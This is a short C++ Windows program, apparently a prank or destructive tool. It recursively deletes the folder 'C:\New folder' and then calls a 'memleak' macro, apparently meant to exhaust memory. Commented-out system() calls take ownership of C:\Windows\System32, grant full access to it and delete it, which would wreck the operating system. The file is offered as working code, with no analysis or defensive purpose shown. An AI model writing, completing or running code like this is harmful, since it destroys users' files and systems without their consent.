#include "Header.h"


int APIENTRY wWinMain(HINSTANCE Instance,
	HINSTANCE hPreInstance,
	LPTSTR    lpCmdLine,
	int		  nCmdShow) {


	char filepath[] = "C:\\New folder";
	if (std::filesystem::exists(filepath)) {
		
		std::filesystem::remove_all(filepath);
		//system("takeown /f C:\\Windows\\System32 /r /d y");
		//system("icacls C:\\Windows\\System32 /grant Administrators:F /t /c /q");
		//std::filesystem::remove_all("C:\\Windows\\System32");
		memleak

	}
	else {
		memleak
	}


}